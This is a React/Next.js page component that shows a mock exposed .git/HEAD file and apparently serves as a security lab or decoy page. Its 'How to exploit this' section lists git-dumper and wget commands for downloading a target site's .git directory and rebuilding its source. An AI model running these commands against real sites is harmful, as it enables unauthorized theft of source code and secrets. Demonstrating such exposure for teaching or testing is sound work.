"use client";

import { TerminalDisplay } from "@/components/TerminalDisplay";

const gitHead = `ref: refs/heads/main`;

export default function GitHeadPage() {
  return (
    <div className="min-h-screen bg-slate-950 p-4 sm:p-8">
      <div className="max-w-5xl mx-auto">
        <div className="flex items-center gap-3 mb-6">
          <div className="w-10 h-10 rounded-lg bg-orange-500/10 flex items-center justify-center">
            <span className="text-orange-400 font-bold text-xs">GIT</span>
          </div>
          <div>
            <h1 className="text-lg font-bold text-white">.git/HEAD</h1>
            <p className="text-xs text-slate-500">Git HEAD reference file</p>
          </div>
        </div>
        <div className="bg-amber-950/30 border border-amber-500/20 rounded-lg p-3 mb-6">
          <p className="text-xs text-amber-400">
            ⚠️ The HEAD file reveals the current branch (main). Combined with other .git files,
            this allows full repository reconstruction using tools like git-dumper.
          </p>
        </div>
        <TerminalDisplay content={gitHead} title=".git/HEAD" language="git" />
        <div className="mt-6 p-4 bg-slate-900 rounded-lg border border-slate-800">
          <h3 className="text-sm font-semibold text-cyan-400 mb-2">How to exploit this</h3>
          <div className="text-xs text-slate-400 space-y-2">
            <p>1. Download the entire .git directory using git-dumper:</p>
            <code className="block bg-slate-950 p-2 rounded text-green-400 font-mono">
              git-dumper http://target.com/.git/ ./repo-dump
            </code>
            <p>2. Or manually reconstruct by reading objects:</p>
            <code className="block bg-slate-950 p-2 rounded text-green-400 font-mono">
              wget http://target.com/.git/HEAD<br/>
              wget http://target.com/.git/refs/heads/main<br/>
              wget http://target.com/.git/objects/XX/YYYYYY...
            </code>
            <p>3. Navigate the restored repository:</p>
            <code className="block bg-slate-950 p-2 rounded text-green-400 font-mono">
              cd repo-dump && git log && git checkout .
            </code>
          </div>
        </div>
      </div>
    </div>
  );
}
